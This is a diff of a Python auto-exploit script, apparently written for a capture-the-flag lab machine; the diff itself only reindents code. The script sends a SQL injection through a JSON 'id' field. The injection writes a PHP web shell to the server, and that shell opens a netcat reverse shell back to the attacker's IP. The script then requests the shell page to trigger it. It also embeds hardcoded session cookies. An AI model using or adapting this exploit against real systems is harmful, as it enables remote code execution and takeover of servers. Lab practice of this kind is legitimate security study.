@@ -25,24 +25,24 @@ signal.signal(signal.SIGINT, def_handler)
 
 class Exploit():
 	def __init__(self, main_url):
-	self.__url = main_url
+		self.__url = main_url
 
 	def upload_file(self):
 
-	headers = {
-		'Content-Type': 'application/json',
-		'Cookie': 'XSRFTOKEN=eyJpdiI6IlFXVmNMS2dSdUpUcGRDZTFLRXBjK0E9PSIsInZhbHVlIjoiUHBXbko3OWpGdzdyOWFlWVJSclJnbzgrZlFxR0FhS1NWaDR5WmdudDBDMTBlRi91bVhIYkE1YzJXWTh5VmczUlRSTVR6dHRuUlpUa1JaN3ZJMjgwQ3pUd21uNnJadEFYS3oxYm5rQVZqdFVFRjc2c3JoRitxT3d0Y2p4TGVLSkUiLCJtYWMiOiJiYTdjZjJiZmViN2Q4NmE0OWJmMjIwNTA2Zjg4YjVmNDY3ZjMyMTNlOTUwN2U1N2NiYmVmZWZkOWNmZmZhMzY1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkdmM2RkeGlEVHBHano2RkRjTDZOUmc9PSIsInZhbHVlIjoiNlk5b2NnK2cvbGFFOG80RWpQcEFQckRrbU9kbjhWckREM2RRcjFwakR3VzNXeHk5dHc4UTFFbU0wZ0tRaGptL3JUeEpSUEZtZEJncXJObWRrQnBNTjE3dnRZaHgwbDI2YlNNL1c4RzB4SVpGNHZ0eWpjNjdRNncwWUJ0QnlvQnYiLCJtYWMiOiI3YjBmNjZjNzk0MjNhMDk2NjY5ZDBlMzIyYzJiOTNiMTg4NDA4ZWU2MjFjOTI1OWM5MGMwYzQ3Njk5ZWUzY2Y5IiwidGFnIjoiIn0%3D',
-		'X-Requested-With': 'XMLHttpRequest'
-	}
+		headers = {
+			'Content-Type': 'application/json',
+			'Cookie': 'XSRFTOKEN=eyJpdiI6IlFXVmNMS2dSdUpUcGRDZTFLRXBjK0E9PSIsInZhbHVlIjoiUHBXbko3OWpGdzdyOWFlWVJSclJnbzgrZlFxR0FhS1NWaDR5WmdudDBDMTBlRi91bVhIYkE1YzJXWTh5VmczUlRSTVR6dHRuUlpUa1JaN3ZJMjgwQ3pUd21uNnJadEFYS3oxYm5rQVZqdFVFRjc2c3JoRitxT3d0Y2p4TGVLSkUiLCJtYWMiOiJiYTdjZjJiZmViN2Q4NmE0OWJmMjIwNTA2Zjg4YjVmNDY3ZjMyMTNlOTUwN2U1N2NiYmVmZWZkOWNmZmZhMzY1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkdmM2RkeGlEVHBHano2RkRjTDZOUmc9PSIsInZhbHVlIjoiNlk5b2NnK2cvbGFFOG80RWpQcEFQckRrbU9kbjhWckREM2RRcjFwakR3VzNXeHk5dHc4UTFFbU0wZ0tRaGptL3JUeEpSUEZtZEJncXJObWRrQnBNTjE3dnRZaHgwbDI2YlNNL1c4RzB4SVpGNHZ0eWpjNjdRNncwWUJ0QnlvQnYiLCJtYWMiOiI3YjBmNjZjNzk0MjNhMDk2NjY5ZDBlMzIyYzJiOTNiMTg4NDA4ZWU2MjFjOTI1OWM5MGMwYzQ3Njk5ZWUzY2Y5IiwidGFnIjoiIn0%3D',
+			'X-Requested-With': 'XMLHttpRequest'
+		}
 
-	# Cambiar IP por la vuestra
-	data_json = {
-		"id": "0 union select 1,2, '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 443 >/tmp/f\"); ?>' into outfile '/srv/altered/public/shell.php';-- -",
+		# Cambiar IP por la vuestra
+		data_json = {
+			"id": "0 union select 1,2, '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 443 >/tmp/f\"); ?>' into outfile '/srv/altered/public/shell.php';-- -",
 		"secret": True
-	}
+		}
 
-	r = get(self.__url+'/api/getprofile', json=data_json, headers=headers)
-	m = get(self.__url+'/shell.php')
+		r = get(self.__url+'/api/getprofile', json=data_json, headers=headers)
+		m = get(self.__url+'/shell.php')
 
 autopwn = Exploit('http://10.10.11.159')
 
